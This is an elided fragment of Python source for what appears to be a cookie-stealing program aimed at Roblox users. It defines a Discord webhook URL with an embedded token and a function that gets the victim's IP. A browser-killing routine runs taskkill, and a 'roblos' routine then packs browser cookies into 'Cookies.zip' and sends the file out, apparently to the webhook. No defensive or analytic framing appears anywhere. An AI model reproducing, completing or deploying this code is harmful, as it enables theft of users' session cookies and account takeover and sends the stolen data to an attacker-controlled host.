...
wbz='https://discord.com/api/webhooks/1323408755425284169/y9lGftEqVFkLls3nFXE2S_8Z534kGwHkt2cc8Mil2r--_l2xGXJLrcOBDNgGX_nc0xLY'
def ip():
 try:
...
def kill_browsers():
    ...
    for browser in browsers:
        print(f"Attempting to kill {browser} processes...")
        os.system(f"taskkill /F /IM {browser} /T")  # Kill browser processes

def roblos():
    kill_browsers()  # Kill all browsers before proceeding
    ...
    if coc:
        ...
        with open("Cookies.zip", 'rb') as file:
            data = {
                ...
                "avatar_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png"
            }
            files = {
